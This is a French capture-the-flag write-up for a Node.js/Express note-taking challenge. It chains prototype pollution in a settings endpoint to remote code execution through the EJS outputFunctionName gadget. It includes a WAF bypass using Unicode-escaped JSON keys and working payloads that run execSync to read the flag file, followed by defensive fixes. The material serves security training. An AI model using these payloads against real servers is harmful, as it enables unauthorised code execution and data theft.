# SwiftNotes — prototype pollution → RCE EJS

- **Cible :** `http://<HOST>:<PORT>` (service note-taking Node.js/Express, moteur EJS)
- **Catégorie :** web
- **Flag :** `CTF{REDACTED}` (voir règle de non-persistance des flags)
- **Fichiers fournis :** `server.js`, `package.json`

## Reconnaissance

`server.js` expose un endpoint de synchronisation des préférences :

```js
app.post('/api/settings', requireAuth, (req, res) => {
  const user = users[req.session.username];
  merge(user.settings, req.body || {});
  res.json({ ok: true, settings: user.settings });
});
```

`merge` est importé de `./utils/merge` (non fourni localement). Le comportement observé :
il copie récursivement les objets, traite les fonctions/feuilles par affectation simple, et
descend donc dans `__proto__` → **prototype pollution**.

Autres faits utiles :

- moteur de vues **EJS** (`app.set('view engine', 'ejs')`) ;
- `app.set('view cache', false)` → recompilation du template à chaque `res.render` ;
- `package.json` : `"ejs": "^3.1.0"` (version déployée vulnérable, `< 3.1.7`).

## Exploitation

### 1. Bypass WAF

`POST /api/settings` avec `{"__proto__":{...}}` renvoie
`403 {"error":"request blocked by security policy"}`. Le WAF matche la chaîne brute sans
décoder les échappements JSON. En encodant en `\uXXXX` :

```python
esc = lambda s: ''.join('\\u%04x' % ord(c) for c in s)
# '__proto__'         -> "\u005f\u005fproto\u005f\u005f"
# 'outputFunctionName'-> "\u006f\u0075\u0074...\u004e\u0061\u006d\u0065"
```

la requête passe (200) et `JSON.parse` recrée les vraies clés.

### 2. Canary sans shell

Pour distinguer « pas de pollution » de « EJS patché » de « commande en échec » :

```python
val = "x;locals.settings.flag='EXECUTED_OK';s"
```

Après `POST /api/settings` puis `GET /settings`, `flag: "EXECUTED_OK"` apparaît → pollution
et gadget EJS confirmés.

### 3. RCE

Gadget `outputFunctionName` (EJS < 3.1.7) :
`var <outputFunctionName> = __append;` → la valeur est injectée telle quelle.

```python
cmd = "cat /data/flag.txt"
val = ("x;var cp=process.getBuiltinModule?process.getBuiltinModule('child_process')"
       ":process.mainModule.require('child_process');"
       "locals.settings.flag=String(cp.execSync(%s));s" % json.dumps(cmd))
```

Le code tourne au début du rendu, `locals` (= données de `res.render`) est en portée ; on
écrit la sortie dans `locals.settings.flag`, affichée par la page grâce à
`JSON.stringify(settings)`.

### 4. Localisation du flag

RCE en `root` dans un conteneur. `entrypoint.sh` montre que `$FLAG` est écrit dans
`/data/flag.txt` (chmod 444) puis retiré de l'environnement. Un `find / -iname '*flag*'`
confirme `/data/flag.txt`.

## Résultat

```
CTF{REDACTED}
```

## Notes de défense

- Fusionner des entrées utilisateur avec un merge qui ignore `__proto__`, `constructor`,
  `prototype` (ou `Object.create(null)` / `structuredClone`).
- Mettre à jour EJS ≥ 3.1.7 (validation stricte des options, `hasOwnOnlyObject`).
- Un WAF qui filtre la chaîne brute ne protège pas d'un payload encodé : valider côté
  applicatif, pas côté chaîne.

## Références

- Fiche technique : `knowledge/web/prototype-pollution-ejs-rce.md`
- CVE-2022-29078
